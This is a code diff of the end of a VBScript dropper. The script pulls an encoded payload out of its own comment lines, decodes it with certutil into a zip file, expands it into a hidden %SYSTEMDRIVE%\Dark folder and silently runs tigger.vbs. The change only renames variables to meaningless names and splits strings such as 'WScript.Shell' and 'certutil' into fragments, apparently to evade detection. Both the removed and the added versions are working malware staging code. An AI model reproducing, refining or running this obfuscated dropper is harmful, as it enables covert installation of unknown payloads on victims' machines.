@@ -5477,90 +5477,73 @@
 
 
 
-Function DeCodeCertutilData(InFile,OutFile)
-	Dim objShell,fso,error_code,command,ScriptSystemObjt,WscritShellObject
-	
-	ScriptSystemObjt = "Scrip" + "ting." + "File" + "System" + "Object"
-	WscritShellObject = "WScript." + "Sh" + "ell"
-	Set objShell = CreateObject(WscritShellObject)
-	Set fso = CreateObject(ScriptSystemObjt)
-	command = "cer" + "tutil -decode " + """" + InFile + """ " + OutFile
-	error_code = objShell.Run (command,0,True)
+Function a1(a2,a3)
+	Dim a4,a5,a6,a7,a8
+	a8 = "Scri" & "ptin" & "g.Fi" & "leSyste" & "mObje" & "ct"
+	a7 = "WSc" & "ript.S" & "he" & "ll"
+	Set a4 = CreateObject(a7)
+	Set a5 = CreateObject(a8)
+	a6 = "ce" & "rtu" & "til -dec" & "ode """ & a2 & """ " & a3
+	a4.Run a6,0,True
 End Function
 
-
-Function ExtractCab(CabFile, ExtractPath)
-	Dim objShell,fso,error_code,command,ScriptSystemObjt,WscritShellObject
-	
-	ScriptSystemObjt = "Scrip" + "ting." + "File" + "System" + "Object"
-	WscritShellObject = "WScript." + "Sh" + "ell"
-	Set objShell = CreateObject(WscritShellObject)
-	Set fso = CreateObject(ScriptSystemObjt)
-	command = "expand " + CabFile + " -F:* " + ExtractPath
-	error_code = objShell.Run (command,0,True)
+Function b1(b2,b3)
+	Dim b4,b5,b6,b7,b8
+	b8 = "Scri" & "ptin" & "g.Fi" & "leSyste" & "mObje" & "ct"
+	b7 = "WSc" & "ript.S" & "he" & "ll"
+	Set b4 = CreateObject(b7)
+	Set b5 = CreateObject(b8)
+	b6 = "ex" & "pand " & b2 & " -F:* " & b3
+	b4.Run b6,0,True
 End Function
 
-
-Function CHdirectory(folderPath)
-    Dim fso, folder
-
-    Set fso = CreateObject("Scripting.FileSystemObject")
-
-    If Not fso.FolderExists(folderPath) Then
-        Set folder = fso.CreateFolder(folderPath)
-
-        folder.Attributes = folder.Attributes + 2
-    Else
-        rem "The folder already exists."
-    End If
-
-    Set folder = Nothing
-    Set fso = Nothing
+Function c1(c2)
+	Dim c3,c4
+	Set c3 = CreateObject("Scri" & "pting.F" & "ileSyst" & "emObject")
+	If Not c3.FolderExists(c2) Then
+		Set c4 = c3.CreateFolder(c2)
+		c4.Attributes = c4.Attributes + 2
+	End If
+	Set c4 = Nothing
+	Set c3 = Nothing
 End Function
 
-
-Function StartClient(AutoStartFile)
-	Dim objShell,error_code,WscritShellObject
-	
-	WscritShellObject = "WScript." + "Sh" + "ell"
-	Set objShell = CreateObject(WscritShellObject)
-	error_code = objShell.Run (AutoStartFile,0,True)
+Function d1(d2)
+	Dim d3,d4
+	d4 = "WSc" & "ript.S" & "hel" & "l"
+	Set d3 = CreateObject(d4)
+	d3.Run d2,0,True
 End Function
 
+Dim x1,x2,x3,x4,x5,x6,x7
+x7 = "WSc" & "ript.S" & "he" & "ll"
+Set x1 = CreateObject(x7)
+x2 = x1.ExpandEnvironmentStrings("%TE" & "MP%")
+x3 = x1.ExpandEnvironmentStrings("%SYST" & "EMDR" & "IVE%")
+x4 = x2 & "\ou" & "tpu" & "t.t" & "xt"
+x5 = x3 & "\D" & "ark\"
+x6 = "cs" & "cript " & x5 & "tigg" & "er.vbs"
 
-Dim objShell,WorkDir,output,ZipFile,AutoStartFile
-WscritShellObject = "WScript." + "Sh" + "ell"
-Set objShell = CreateObject(WscritShellObject)
-TMPATH = objShell.ExpandEnvironmentStrings("%TEMP%")
-SystemDrive = objShell.ExpandEnvironmentStrings("%SYSTEMDRIVE%")
-output = TMPATH + "\output.txt"
-WorkDir = SystemDrive + "\Dark\"
-ZipFile = WorkDir + "DE.zip"
-AutoStartFile = "cscript " + WorkDir + "tigger.vbs"
+Set x8 = CreateObject("Scri" & "pting.Fi" & "leSys" & "temObj" & "ect")
+Set x9 = x8.OpenTextFile(WScript.ScriptFullName, 1)
+Set x10 = x8.OpenTextFile(x4, 2, True)
 
-
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-
-Set objFile = objFSO.OpenTextFile(WScript.ScriptFullName, 1)
-
-Set objCommentFile = objFSO.OpenTextFile(output, 2, True)
-
-Do Until objFile.AtEndOfStream
-    strLine = objFile.ReadLine
-    If Left(Trim(strLine), 1) = "'" Then
-        objCommentFile.WriteLine Mid(strLine, 2)
+Do Until x9.AtEndOfStream
+    s1 = x9.ReadLine
+    If Left(Trim(s1),1) = "'" Then
+        x10.WriteLine Mid(s1,2)
     End If
 Loop
 
-objFile.Close
-objCommentFile.Close
+x9.Close
+x10.Close
 
-Set objFile = Nothing
-Set objCommentFile = Nothing
-Set objFSO = Nothing
+Set x9 = Nothing
+Set x10 = Nothing
+Set x8 = Nothing
 
+c1 x5
+a1 x4,x5 & "DE.z" & "ip"
+b1 x5 & "DE.z" & "ip",x5
+d1 x6
 
-CHdirectory WorkDir
-DeCodeCertutilData output,ZipFile
-ExtractCab ZipFile,WorkDir
-StartClient AutoStartFile
